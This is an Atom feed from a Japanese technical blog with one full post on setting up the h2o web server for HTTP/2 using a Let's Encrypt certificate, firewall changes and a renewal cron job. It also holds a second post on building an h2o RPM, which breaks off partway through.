<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[Simple blog @atani]]></title>
  
  <link href="/atom.xml" rel="self"/>
  <link href="http://atani.github.io/"/>
  <updated>2016-02-11T04:07:36.000Z</updated>
  <id>http://atani.github.io/</id>
  
  <author>
    <name><![CDATA[atani]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[h2oとLet's Encryptを使ってhttp/2に対応する]]></title>
    <link href="http://atani.github.io/2016/02/letsencrypt-h2o/"/>
    <id>http://atani.github.io/2016/02/letsencrypt-h2o/</id>
    <published>2016-02-11T04:07:23.000Z</published>
    <updated>2016-02-11T04:07:36.000Z</updated>
    <content type="html"><![CDATA[<p>h2oによるhttp/2に対応した備忘録。<br>主要ブラウザは、HTTP/2に対応しているが、HTTP/2 over TLSのみなので、<br>SSLサーバ証明書が必要になる。<br>そのため、証明書には最近話題の<a href="https://letsencrypt.org" target="_blank" rel="external">Let’s Encrypt</a> を利用した。</p>
<a id="more"></a>
<h2 id="SSL_u30B5_u30FC_u30D0_u8A3C_u660E_u66F8_u3092_u767A_u884C"><a href="#SSL_u30B5_u30FC_u30D0_u8A3C_u660E_u66F8_u3092_u767A_u884C" class="headerlink" title="SSLサーバ証明書を発行"></a>SSLサーバ証明書を発行</h2><p>Let’s Encryptのソースをgitリポジトリからcloneしてくる。</p>
<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># cd /usr/local/</span></span><br><span class="line"><span class="preprocessor"># git clone https://github.com/letsencrypt/letsencrypt</span></span><br></pre></td></tr></table></figure>
<p>Let’s Encrypt の依存するパッケージを自動でインストールする。</p>
<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># cd letsencrypt</span></span><br><span class="line"><span class="preprocessor"># ./letsencrypt-auto --help</span></span><br></pre></td></tr></table></figure>
<p>証明書を作成するために、ドメインへのアクセスがあるのでアクセスできるようにしておく。<br>h2oのでのアクセスログは以下のようなログだった。</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.0.1</span> - - <span class="string">[10/Feb/2016:10:04:11 +0900]</span> <span class="string">"<span class="keyword">GET</span> /.well-known/acme-challenge/4cHoLYVoyqHvhKcW7zMz08ixIUfxT3cO5uQc6wx-cYk HTTP/1.1"</span> <span class="number">200</span> <span class="number">87</span> <span class="string">"-"</span> <span class="string">"Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"</span></span><br></pre></td></tr></table></figure>
<p>証明書発行のコマンドは以下。</p>
<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># ./letsencrypt-auto certonly \</span><br><span class="line">-<span class="ruby">-webroot -w /var/www/html/example.com/ \ <span class="comment"># ドキュメントルート</span></span><br><span class="line"></span>-<span class="ruby">d example.com \ <span class="comment"># FQDN</span></span><br><span class="line"></span>-<span class="ruby">m hoge<span class="variable">@example</span>.com \ <span class="comment"># メールアドレス</span></span><br><span class="line"></span>-<span class="ruby">-agree-tos <span class="comment"># Let's Encryptの利用規約に同意する。</span></span></span><br></pre></td></tr></table></figure>
<p>なんらかの原因でアクセスできない場合は以下のようなエラーになる。</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># ./letsencrypt-auto certonly --webroot -w /<span class="keyword">var</span>/www/html/example.com/ -d example.com -m hoge@example.com --agree-tos</span><br><span class="line">Updating letsencrypt <span class="keyword">and</span> <span class="keyword">virtual</span> environment dependencies......</span><br><span class="line">Requesting root privileges <span class="keyword">to</span> run <span class="keyword">with</span> virtualenv: /root/.local/share/letsencrypt/bin/letsencrypt certonly --webroot -w /<span class="keyword">var</span>/www/html/example.com/ -d example.com -m hoge@example.com --agree-tos</span><br><span class="line">Failed authorization <span class="function"><span class="keyword">procedure</span>. <span class="title">example</span>.<span class="title">com</span> <span class="params">(http-01)</span>:</span> urn:acme:error:connection :: The server could <span class="keyword">not</span> connect <span class="keyword">to</span> the client <span class="keyword">to</span> verify the domain :: Could <span class="keyword">not</span> connect <span class="keyword">to</span> http:<span class="comment">//example.com/.well-known/acme-challenge/QlsKdh9xfkuDr2mm-iIEyC58ep0tsy2gqX3K1nhJo0M</span></span><br><span class="line"></span><br><span class="line">IMPORTANT NOTES:</span><br><span class="line"> - The following errors were reported <span class="keyword">by</span> the server:</span><br><span class="line"></span><br><span class="line">   Domain: example.com</span><br><span class="line">   <span class="keyword">Type</span>:   urn:acme:error:connection</span><br><span class="line">   Detail: Could <span class="keyword">not</span> connect <span class="keyword">to</span> http:<span class="comment">//example.com/.well-known</span></span><br><span class="line">   /acme-challenge/QlsKdh9xfkuDr2mm-iIEyC58ep0tsy2gqX3K1nhJo0M</span><br></pre></td></tr></table></figure>
<p>ちなみに今回は、firewallで弾かれていたので、80/443ポートを解放してあげた。</p>
<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># firewall-cmd --permanent --add-port 80/tcp</span></span><br><span class="line"><span class="preprocessor"># firewall-cmd --permanent --add-port 443/tcp</span></span><br><span class="line"><span class="preprocessor"># systemctl restart firewalld.service</span></span><br></pre></td></tr></table></figure>
<p>再度実行で、証明書が作成された。</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># ./letsencrypt-auto certonly --webroot -w /<span class="keyword">var</span>/www/html/example.com/ -<span class="keyword">d</span> example.com -<span class="keyword">m</span> hoge@example.com --agree-tos</span><br><span class="line">Updating letsencrypt and virtual environment dependencies......</span><br><span class="line">Requesting root privileges to <span class="keyword">run</span> with virtualenv: /root/.<span class="keyword">local</span>/share/letsencrypt/bin/letsencrypt certonly --webroot -w /<span class="keyword">var</span>/www/html/example.com/ -<span class="keyword">d</span> example.com -<span class="keyword">m</span> hoge@example.com --agree-tos</span><br><span class="line"></span><br><span class="line">IMPORTANT <span class="keyword">NOTES</span>:</span><br><span class="line"> - Congratulations! Your certificate and chain have been saved at</span><br><span class="line">   /etc/letsencrypt/live/example.com/fullchain.pem. Your cert</span><br><span class="line">   will expire <span class="keyword">on</span> 2016-05-10. To obtain a new <span class="keyword">version</span> of the</span><br><span class="line">   certificate <span class="keyword">in</span> the future, simply <span class="keyword">run</span> Let's Encrypt again.</span><br><span class="line"> - <span class="keyword">If</span> you like Let's Encrypt, please consider supporting our work <span class="keyword">by</span>:</span><br><span class="line"></span><br><span class="line">   Donating to ISRG / Let's Encrypt:   https:<span class="comment">//letsencrypt.org/donate</span></span><br><span class="line">   Donating to EFF:                    https:<span class="comment">//eff.org/donate-le</span></span><br></pre></td></tr></table></figure>
<p>証明書の実態は<code>/etc/letsencrypt/archive/[ドメイン]</code>配下にでき、 <code>/etc/letsencrypt/live/[ドメイン]</code> がsymlinkとなっている。設定する際は、<code>/etc/letsencrypt/live/[ドメイン]</code> を利用すると良い。</p>
<h2 id="h2o_u306E_u8A2D_u5B9A"><a href="#h2o_u306E_u8A2D_u5B9A" class="headerlink" title="h2oの設定"></a>h2oの設定</h2><p><code>/etc/h2o/h2o.conf</code> にSSL証明書の設定をする。</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">http2-<span class="symbol">casper:</span> <span class="constant">ON</span></span><br><span class="line">http2-reprioritize-blocking-<span class="symbol">assets:</span> <span class="constant">ON</span></span><br><span class="line">max-<span class="symbol">connections:</span> <span class="number">128</span></span><br><span class="line">num-<span class="symbol">threads:</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">user:</span> nobody</span><br><span class="line"><span class="symbol">hosts:</span></span><br><span class="line">  <span class="string">"example.com"</span><span class="symbol">:</span></span><br><span class="line">    <span class="symbol">listen:</span> <span class="number">80</span></span><br><span class="line">    <span class="symbol">listen:</span></span><br><span class="line">      <span class="symbol">port:</span> <span class="number">443</span></span><br><span class="line">      <span class="symbol">ssl:</span></span><br><span class="line">        certificate-<span class="symbol">file:</span> /etc/letsencrypt/live/example.com/fullchain.pem</span><br><span class="line">        key-<span class="symbol">file:</span> /etc/letsencrypt/live/example.com/privkey.pem</span><br><span class="line">        minimum-<span class="symbol">version:</span> <span class="constant">TLSv1</span></span><br><span class="line">        cipher-<span class="symbol">suite:</span> <span class="constant">ECDHE</span>-<span class="constant">RSA</span>-<span class="constant">AES128</span>-<span class="constant">GCM</span>-<span class="constant">SHA256</span><span class="symbol">:ECDHE-ECDSA-AES128-GCM-SHA256</span><span class="symbol">:ECDHE-RSA-AES256-GCM-SHA384</span><span class="symbol">:ECDHE-ECDSA-AES256-GCM-SHA384</span><span class="symbol">:DHE-RSA-AES128-GCM-SHA256</span><span class="symbol">:DHE-DSS-AES128-GCM-SHA256</span><span class="symbol">:kEDH+AESGCM</span><span class="symbol">:ECDHE-RSA-AES128-SHA256</span><span class="symbol">:ECDHE-ECDSA-AES128-SHA256</span><span class="symbol">:ECDHE-RSA-AES128-SHA</span><span class="symbol">:ECDHE-ECDSA-AES128-SHA</span><span class="symbol">:ECDHE-RSA-AES256-SHA384</span><span class="symbol">:ECDHE-ECDSA-AES256-SHA384</span><span class="symbol">:ECDHE-RSA-AES256-SHA</span><span class="symbol">:ECDHE-ECDSA-AES256-SHA</span><span class="symbol">:DHE-RSA-AES128-SHA256</span><span class="symbol">:DHE-RSA-AES128-SHA</span><span class="symbol">:DHE-DSS-AES128-SHA256</span><span class="symbol">:DHE-RSA-AES256-SHA256</span><span class="symbol">:DHE-DSS-AES256-SHA</span><span class="symbol">:DHE-RSA-AES256-SHA</span><span class="symbol">:</span>!<span class="symbol">aNULL:</span>!<span class="symbol">eNULL:</span>!<span class="constant">EXPORT</span><span class="symbol">:</span>!<span class="constant">DES</span><span class="symbol">:</span>!<span class="constant">RC4</span><span class="symbol">:</span>!<span class="number">3</span><span class="constant">DES:</span>!<span class="constant">MD5</span><span class="symbol">:</span>!<span class="constant">PSK</span></span><br><span class="line">    <span class="symbol">paths:</span></span><br><span class="line">      <span class="string">"/"</span><span class="symbol">:</span></span><br><span class="line">        file.<span class="symbol">dir:</span> /var/www/html/example.com</span><br><span class="line">access-<span class="symbol">log:</span> /var/log/h2o/access.log</span><br><span class="line">error-<span class="symbol">log:</span> /var/log/h2o/error.log</span><br><span class="line">pid-<span class="symbol">file:</span> /var/run/h2o/h2o.pid</span><br></pre></td></tr></table></figure>
<p>h2oがうまく起動しない場合、 <code>systemctl status h2o.service</code> で確認する。以下は、keyファイル名を間違っていて起動できなかった時のログ(h2oのログには出なかった)。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># systemctl status h2o.service</span><br><span class="line">● h2o.service - H2O - the optimized HTTP/1, HTTP/2 server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/h2o.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: failed (Result: exit-code) since 水 2016-02-10 10:27:27 JST; 1min 16s ago</span><br><span class="line">  Process: 2496 ExecStop=/bin/<span class="operator"><span class="keyword">kill</span> -TERM $&#123;MAINPID&#125; (code=exited, <span class="keyword">status</span>=<span class="number">1</span>/<span class="keyword">FAILURE</span>)</span><br><span class="line">  Process: <span class="number">9099</span> ExecReload=/<span class="keyword">bin</span>/<span class="keyword">kill</span> -HUP $&#123;MAINPID&#125; (code=exited, <span class="keyword">status</span>=<span class="number">0</span>/<span class="keyword">SUCCESS</span>)</span><br><span class="line">  Process: <span class="number">2495</span> ExecStart=/usr/<span class="keyword">bin</span>/h2o -<span class="keyword">m</span> <span class="keyword">master</span> -<span class="keyword">c</span> /etc/h2o/h2o.conf (code=exited, <span class="keyword">status</span>=<span class="number">78</span>)</span><br><span class="line"> <span class="keyword">Main</span> PID: <span class="number">2495</span> (code=exited, <span class="keyword">status</span>=<span class="number">78</span>)</span><br><span class="line"></span><br><span class="line"> <span class="number">2</span>月 <span class="number">10</span> <span class="number">10</span>:<span class="number">27</span>:<span class="number">27</span> example.com systemd[<span class="number">1</span>]: <span class="keyword">Starting</span> H2O - the optimized <span class="keyword">HTTP</span>/<span class="number">1</span>, <span class="keyword">HTTP</span>/<span class="number">2</span> <span class="keyword">server</span>...</span><br><span class="line"> <span class="number">2</span>月 <span class="number">10</span> <span class="number">10</span>:<span class="number">27</span>:<span class="number">27</span> example.com h2o[<span class="number">2495</span>]: [/etc/h2o/h2o.conf:<span class="number">13</span>] <span class="keyword">in</span> command listen, <span class="keyword">failed</span> <span class="keyword">to</span> <span class="keyword">load</span> <span class="keyword">private</span> <span class="keyword">key</span> <span class="keyword">file</span>:/etc/letsencrypt/live/example.com/privkey1.pem</span><br><span class="line"> <span class="number">2</span>月 <span class="number">10</span> <span class="number">10</span>:<span class="number">27</span>:<span class="number">27</span> example.com h2o[<span class="number">2495</span>]: <span class="number">139896520619968</span>:<span class="keyword">error</span>:<span class="number">02001002</span>:<span class="keyword">system</span> <span class="keyword">library</span>:fopen:<span class="keyword">No</span> such <span class="keyword">file</span> <span class="keyword">or</span> <span class="keyword">directory</span>:bio/bss_file.<span class="keyword">c</span>:<span class="number">255</span>:fopen(<span class="string">'/etc/letsencrypt/live/cra...1.pem'</span>, <span class="string">'r'</span>)</span><br><span class="line"> <span class="number">2</span>月 <span class="number">10</span> <span class="number">10</span>:<span class="number">27</span>:<span class="number">27</span> example.com h2o[<span class="number">2495</span>]: <span class="number">139896520619968</span>:<span class="keyword">error</span>:<span class="number">20074002</span>:BIO routines:FILE_CTRL:<span class="keyword">system</span> lib:bio/bss_file.<span class="keyword">c</span>:<span class="number">257</span>:</span><br><span class="line"> <span class="number">2</span>月 <span class="number">10</span> <span class="number">10</span>:<span class="number">27</span>:<span class="number">27</span> example.com h2o[<span class="number">2495</span>]: <span class="number">139896520619968</span>:<span class="keyword">error</span>:<span class="number">140</span>B0002:SSL routines:SSL_CTX_use_PrivateKey_file:<span class="keyword">system</span> lib:ssl_rsa.<span class="keyword">c</span>:<span class="number">596</span>:</span><br><span class="line"> <span class="number">2</span>月 <span class="number">10</span> <span class="number">10</span>:<span class="number">27</span>:<span class="number">27</span> example.com systemd[<span class="number">1</span>]: h2o.service: <span class="keyword">main</span> process exited, code=exited, <span class="keyword">status</span>=<span class="number">78</span>/<span class="keyword">n</span>/a</span><br><span class="line"> <span class="number">2</span>月 <span class="number">10</span> <span class="number">10</span>:<span class="number">27</span>:<span class="number">27</span> example.com <span class="keyword">kill</span>[<span class="number">2496</span>]: <span class="keyword">kill</span>: cannot find process <span class="string">""</span></span><br><span class="line"> <span class="number">2</span>月 <span class="number">10</span> <span class="number">10</span>:<span class="number">27</span>:<span class="number">27</span> example.com systemd[<span class="number">1</span>]: h2o.service: control process exited, code=exited <span class="keyword">status</span>=<span class="number">1</span></span><br><span class="line"> <span class="number">2</span>月 <span class="number">10</span> <span class="number">10</span>:<span class="number">27</span>:<span class="number">27</span> example.com systemd[<span class="number">1</span>]: Unit h2o.service entered <span class="keyword">failed</span> state.</span><br><span class="line"> <span class="number">2</span>月 <span class="number">10</span> <span class="number">10</span>:<span class="number">27</span>:<span class="number">27</span> example.com systemd[<span class="number">1</span>]: h2o.service <span class="keyword">failed</span>.</span><br><span class="line">Hint: <span class="keyword">Some</span> <span class="keyword">lines</span> were ellipsized, <span class="keyword">use</span> -<span class="keyword">l</span> <span class="keyword">to</span> <span class="keyword">show</span> <span class="keyword">in</span> <span class="keyword">full</span>.</span></span><br></pre></td></tr></table></figure>
<p>該当箇所を修正後、無事にh2oが起動した。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># systemctl status h2o.service</span></span><br><span class="line">● h2o.service - H2O - the optimized HTTP/<span class="number">1</span>, HTTP/<span class="number">2</span> server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/h2o.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since 水 <span class="number">2016</span>-<span class="number">02</span>-<span class="number">10</span> <span class="number">10</span>:<span class="number">29</span>:<span class="number">31</span> JST; <span class="number">28</span>min ago</span><br><span class="line">  Process: <span class="number">2496</span> ExecStop=/bin/kill -TERM $&#123;MAINPID&#125; (code=exited, status=<span class="number">1</span>/FAILURE)</span><br><span class="line">  Process: <span class="number">3155</span> ExecReload=/bin/kill -HUP $&#123;MAINPID&#125; (code=exited, status=<span class="number">0</span>/SUCCESS)</span><br><span class="line"> Main PID: <span class="number">2523</span> (perl)</span><br><span class="line">   CGroup: /system.slice/h2o.service</span><br><span class="line">           ├─<span class="number">2523</span> perl -x /usr/share/h2o/start_server --pid-file=/var/run/h2o/h2o.pid --<span class="built_in">log</span>-file=/var/<span class="built_in">log</span>/h2o/error.<span class="built_in">log</span> --port=<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">80</span> --port=[::]:<span class="number">80</span> --port=<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">443</span> --port=[::]:<span class="number">443</span> -- /usr/bin/...</span><br><span class="line">           ├─<span class="number">3157</span> /usr/bin/h2o -c /etc/h2o/h2o.conf</span><br><span class="line">           ├─<span class="number">3158</span> /usr/bin/h2o -c /etc/h2o/h2o.conf</span><br><span class="line">           └─<span class="number">3163</span> perl -x /usr/share/h2o/annotate-backtrace-symbols</span><br><span class="line"></span><br><span class="line"> <span class="number">2</span>月 <span class="number">10</span> <span class="number">10</span>:<span class="number">29</span>:<span class="number">31</span> example.com systemd[<span class="number">1</span>]: Started H2O - the optimized HTTP/<span class="number">1</span>, HTTP/<span class="number">2</span> server.</span><br><span class="line"> <span class="number">2</span>月 <span class="number">10</span> <span class="number">10</span>:<span class="number">29</span>:<span class="number">31</span> example.com systemd[<span class="number">1</span>]: Starting H2O - the optimized HTTP/<span class="number">1</span>, HTTP/<span class="number">2</span> server...</span><br><span class="line"> <span class="number">2</span>月 <span class="number">10</span> <span class="number">10</span>:<span class="number">29</span>:<span class="number">31</span> example.com h2o[<span class="number">2523</span>]: start_server (pid:<span class="number">2523</span>) starting now...</span><br><span class="line"> <span class="number">2</span>月 <span class="number">10</span> <span class="number">10</span>:<span class="number">42</span>:<span class="number">03</span> example.com systemd[<span class="number">1</span>]: Reloaded H2O - the optimized HTTP/<span class="number">1</span>, HTTP/<span class="number">2</span> server.</span><br></pre></td></tr></table></figure>
<h2 id="u52D5_u4F5C_u78BA_u8A8D"><a href="#u52D5_u4F5C_u78BA_u8A8D" class="headerlink" title="動作確認"></a>動作確認</h2><p>firefoxで、httpsでアクセスしてみると、SSLにてアクセスできていることが確認出来た。</p>
<img src="/2016/02/letsencrypt-h2o/screenshot.png" alt="[screenshot.png]" title="[screenshot.png]">
<p>イナヅママークが青くなっていれば、http/2 でアクセスしている。<br>(※ firefoxのアドオン <a href="https://addons.mozilla.org/ja/firefox/addon/spdy-indicator/" target="_blank" rel="external">HTTP/2 and SPDY indicator</a> をインストールする事で利用可能となる)</p>
<p>なお、アクセスログでも確認ができる。</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.0.1</span> - - <span class="string">[11/Feb/2016:12:40:14 +0900]</span> <span class="string">"<span class="keyword">GET</span> / HTTP/2"</span> <span class="number">200</span> <span class="number">493</span> <span class="string">"-"</span> <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:40.0) Gecko/20100101 Firefox/40.0"</span></span><br></pre></td></tr></table></figure>
<p>SSL証明書は以下の通り。</p>
<img src="/2016/02/letsencrypt-h2o/letsencrypt.png" alt="[letsencrypt.png]" title="[letsencrypt.png]">
<h2 id="SSL_u8A55_u4FA1"><a href="#SSL_u8A55_u4FA1" class="headerlink" title="SSL評価"></a>SSL評価</h2><p><a href="https://www.ssllabs.com/ssltest/" target="_blank" rel="external">Qualys SSL Report</a> にてSSL評価チェック。</p>
<img src="/2016/02/letsencrypt-h2o/report.png" alt="[report.png]" title="[report.png]">
<p>まずまずではないだろうか。</p>
<h2 id="Let_u2019s_Encrypt__u81EA_u52D5_u66F4_u65B0_u8A2D_u5B9A"><a href="#Let_u2019s_Encrypt__u81EA_u52D5_u66F4_u65B0_u8A2D_u5B9A" class="headerlink" title="Let’s Encrypt 自動更新設定"></a>Let’s Encrypt 自動更新設定</h2><p>Let’s Encryptの証明書有効期間が90日と短いため、自動で更新されるように以下、登録する。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">05</span> <span class="number">01</span> * * /usr/local/letsencrypt-<span class="keyword">auto</span> certonly --webroot -w /var/www/html/example.com -d example.com -m hoge@example.com --renew-by-<span class="keyword">default</span> &amp;&amp; /bin/systemctl reload h2o</span><br></pre></td></tr></table></figure>
<h3 id="u53C2_u7167URL"><a href="#u53C2_u7167URL" class="headerlink" title="参照URL"></a>参照URL</h3><ul>
<li><a href="https://blog.apar.jp/linux/3619/" target="_blank" rel="external">Let’s Encrypt サーバー証明書の取得と自動更新設定メモ</a></li>
<li><a href="http://d.hatena.ne.jp/kazu-yamamoto/20141219/1418976024" target="_blank" rel="external">HTTP/2から見えるTLS事情</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>h2oによるhttp/2に対応した備忘録。<br>主要ブラウザは、HTTP/2に対応しているが、HTTP/2 over TLSのみなので、<br>SSLサーバ証明書が必要になる。<br>そのため、証明書には最近話題の<a href="https://letsencrypt.org">Let’s Encrypt</a> を利用した。</p>]]>
    
    </summary>
    
      <category term="h2o" scheme="http://atani.github.io/tags/h2o/"/>
    
      <category term="http2" scheme="http://atani.github.io/tags/http2/"/>
    
      <category term="letsencrypt" scheme="http://atani.github.io/tags/letsencrypt/"/>
    
      <category term="ssl" scheme="http://atani.github.io/tags/ssl/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[h2o-rpmで、rpmファイルを作ってh2oをアップデートする。]]></title>
    <link href="http://atani.github.io/2016/02/h2o-rpm-update/"/>
    <id>http://atani.github.io/2016/02/h2o-rpm-update/</id>
    <published>2016-02-09T04:31:16.000Z</published>
    <updated>2016-02-09T04:36:00.000Z</updated>
    <content type="html"><![CDATA[<p>h2oのバージョンが上がっていたので、新しいバージョンのh2oのrpmファイルを作り、アップデート作業を行う。<br>@tatsushid さんが h2oをビルドするためのスペックファイルを準備してくれているので、こちらに甘えることとする。</p>
<p>また、コンパイルにはmakeが必要なので、 <code>cmake</code> をインストールしておく。</p>
<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># yum install cmake</span></span><br></pre></td></tr></table></figure>
<p>そもそもh2oとは？と疑問になる方は作者のKazuhoさんの記事<a href="http://blog.kazuhooku.com/2015/02/http-h2o.html" target="_blank" rel="external">なぜ今、新しいHTTPサーバが必要なのか</a>をご覧ください。</p>
<a id="more"></a>
<h2 id="rpm_u4F5C_u6210_u624B_u9806"><a href="#rpm_u4F5C_u6210_u624B_u9806" class="headerlink" title="rpm作成手順"></a>rpm作成手順</h2><p>h2o-rpmをcloneする</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># git clone https:<span class="comment">//github.com/tatsushid/h2o-rpm.git</span></span></span><br></pre></td></tr></table></figure>
<p>rpmbuild をする。すると必要ファイルがデフォルトだとホームディレクトリに作成される。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># cd h2o-rpm/rpmbuild/SPECS/</span></span><br><span class="line"><span class="preprocessor"># rpmbuild -ba h2o.spec</span></span><br><span class="line">エラー: ファイル /root/rpmbuild/SOURCES/v1<span class="number">.7</span><span class="number">.0</span>.tar.gz: そのようなファイルやディレクトリはありません</span><br></pre></td></tr></table></figure>
<p>なお、rpmbuildコマンドがない場合は以下実行。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># yum -y <span class="operator"><span class="keyword">install</span> rpm-<span class="keyword">build</span></span></span><br></pre></td></tr></table></figure>
<p>執筆時点で、h2oの最新安定版は1.7.0だが、specファイルを少し触りたいので一つ前のバージョンを使用する。<br>こちらのtarballファイルを<code>/root/rpmbuil/SOUCES</code> 配下に配置する。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># wget https:<span class="comment">//github.com/h2o/h2o/archive/v1.6.3.tar.gz</span></span></span><br><span class="line"><span class="preprocessor"># mv v1<span class="number">.6</span><span class="number">.3</span>.tar.gz /root/rpmbuild/SOURCES/</span></span><br></pre></td></tr></table></figure>
<p>デフォルトだと、v1.7.0をビルドしようとするので、specファイルの<br> <code>Version:</code> を <code>1.6.3</code> にする。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># diff -ur h2o.spec_old h2o.spec</span></span><br><span class="line">--- h2o.spec_old    <span class="number">2016</span>-<span class="number">02</span>-<span class="number">09</span> <span class="number">12</span>:<span class="number">51</span>:<span class="number">17.899503647</span> +<span class="number">0900</span></span><br><span class="line">+++ h2o.spec    <span class="number">2016</span>-<span class="number">02</span>-<span class="number">09</span> <span class="number">12</span>:<span class="number">58</span>:<span class="number">57.758516137</span> +<span class="number">0900</span></span><br><span class="line">@@ -<span class="number">20</span>,<span class="number">7</span> +<span class="number">20</span>,<span class="number">7</span> @@</span><br><span class="line"></span><br><span class="line"> Summary: H2O - The optimized HTTP/<span class="number">1</span>, HTTP/<span class="number">2</span> server</span><br><span class="line"> Name: h2o</span><br><span class="line">-Version: <span class="number">1.7</span><span class="number">.0</span></span><br><span class="line">+Version: <span class="number">1.6</span><span class="number">.3</span></span><br><span class="line"> Release: <span class="number">1</span>%&#123;?dist&#125;</span><br><span class="line"> URL: https:<span class="comment">//h2o.examp1e.net/</span></span><br><span class="line"> Source0: https:<span class="comment">//github.com/h2o/h2o/archive/v%&#123;version&#125;.tar.gz</span></span><br></pre></td></tr></table></figure>
<p><code>h2o-rpm</code> の SOURCESにはあらかじめ必要なconfや起動ファイルがあるのでこれを丸ごと、先ほど作った <code>/root/rpmbuild/SOURCES/</code> にコピーする。</p>
